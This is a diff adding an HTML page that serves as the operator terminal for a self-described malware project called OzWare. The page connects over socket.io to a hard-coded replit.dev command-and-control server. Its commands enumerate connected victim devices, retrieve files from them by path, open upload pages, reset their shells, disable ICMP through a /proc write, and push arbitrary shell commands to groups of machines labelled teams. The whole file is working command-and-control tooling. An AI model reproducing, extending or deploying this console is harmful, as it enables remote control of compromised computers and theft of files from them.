@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>OzWare :0</title>
+  <script src="https://cdn.jsdelivr.net/npm/jquery"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/3.0.4/socket.io.js" integrity="sha512-aMGMvNYu8Ue4G+fHa359jcPb1u+ytAF+P2SCb+PxrjCdO3n3ZTxJ30zuH39rimUggmTwmh2u7wvQsDTHESnmfQ==" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css" />
+</head>
+<template id="greetings">
+  ________           __      __                            _______   
+  \_____  \ ________/  \    /  \_____ _______   ____    /\ \   _  \  
+   /   |   \\___   /\   \/\/   /\__  \\_  __ \_/ __ \   \/ /  /_\  \ 
+  /    |    \/    /  \        /  / __ \|  | \/\  ___/   /\ \  \_/   \
+  \_______  /_____ \  \__/\  /  (____  /__|    \___  >  \/  \_____  /
+          \/      \/       \/        \/            \/             \/ 
+
+  A Shitty Attempt At Coding Malware
+  __________________________________________________________________________
+
+  Run help to get started
+</template>
+
+<body>
+
+</body>
+<script>
+  function downloadStringAsFile(content, filename) {
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.style.display = 'none';
+    link.href = url;
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    URL.revokeObjectURL(url);
+    document.body.removeChild(link);
+  }
+
+  
+  var socket = io();
+  socket.connect("https://5f00c95c-a8e5-418a-860c-73847d4e1fcc-00-1cil80yv437ea.janeway.replit.dev/")
+
+  socket.on("fileStage2", (data) => {
+    if (data["SID"] == socket.id) {
+      if (data["FILE"] != null) {
+        downloadStringAsFile(data["FILE"], data["FILENAME"]);
+      } else {
+        $('body').terminal().echo("Could Not Get File");
+      }
+    }
+  });
+
+    
+  $('body').terminal({
+    help: function (command) {
+      let commandToMessage = {
+        'help': `Really? You need help on that?`,
+        'list': 'Lists all commands',
+        'echo': 'Really? You need help on that?',
+        'clear': 'Clears the terminal',
+        'upload': 'Redirects you to an upload page',
+        'reset': 'Resets a devices shell',
+        'getfile': 'Gets a file from a specific directory',
+        'devices': 'Lists all currently connected devices',
+        'connect': 'Connect to a device',
+        'disableICMP': 'Disables ICMP for a team',
+        'sendteam': 'Sends command computers in a specific team. Make sure to wrap your command in ""',
+      }
+      let messageString = commandToMessage[command] || `        Run list to see all commands
+        Run help [command] to get help on a specific command`
+      this.echo(messageString)
+    },
+
+    getfile: function (ip, filepath) {
+      var self = this
+      textToEcho = `Device ${ip} not connected`
+      socket.emit('devices', function (response) {
+        for (const [machineSID, machineIP] of Object.entries(response)) {
+          if (machineIP === ip) {
+            socket.emit('getFile', {'IP': ip, 'FILEPATH': filepath, 'SID': socket.id})
+            textToEcho = `Getting ${filepath} from ${ip}`
+          }
+        }
+        self.echo(textToEcho)
+      })
+    },
+
+    reset: function (ip) {
+      var self = this
+      textToEcho = `Device ${ip} not connected`
+      socket.emit('devices', function (response) {
+        for (const [machineSID, machineIP] of Object.entries(response)) {
+          if (machineIP === ip) {
+            socket.emit("reset", {"SID": machineSID})
+            textToEcho = `Rested attempted at ${ip}, try to reconnect`
+          }
+        }
+        self.echo(textToEcho)
+      })
+    },
+
+    upload: function (ip) {
+      var self = this
+      socket.emit('devices', function (response) {
+        for (const [machineSID, machineIP] of Object.entries(response)) {
+          if (machineIP === ip) {
+            window.location.href = machineSID+"/upload"
+          }
+        }
+        self.echo(`Device ${ip} not connected`)
+      })
+    },
+
+    echo: function (command) {
+      this.echo(command)
+    },
+
+    list: function () {
+      this.echo("help, list, echo, clear, devices, connect, disableICMP, sendteam, getfile, upload, reset")
+    },
+
+    connect: function (ip) {
+      var self = this;
+      socket.emit('devices', function (response) {
+        for (const [machineSID, machineIP] of Object.entries(response)) {
+          if (machineIP === ip) {
+            window.location.href = machineSID
+          }
+        }
+        self.echo(`Device ${ip} not connected`)
+      })
+    },
+    
+    devices: function() {
+      var self = this;
+      socket.emit('devices', function (response) {
+      amount = 0
+      	for (i in Object.values(response)) {
+      		amount += 1
+      	}
+        self.echo(String(Object.values(response).join(', '))+" Total: "+String(amount))
+      })
+  },
+  
+    disableICMP: function (team) {
+      var self = this;
+      socket.emit('commandTeam', {"TEAM": team, "COMMAND": `echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all`}, function (response) {
+        self.echo(String(response))
+      })
+    },
+
+    sendteam: function (team, command) {
+      var self = this;
+      socket.emit('commandTeam', {"TEAM": team, "COMMAND": command}, function (response) {
+        self.echo(String(response))
+      })
+    }, 
+  
+  }, {
+    checkArity: false,
+    completion: true,
+    greetings: greetings.innerHTML,
+  });
+</script>
+  
+</html>
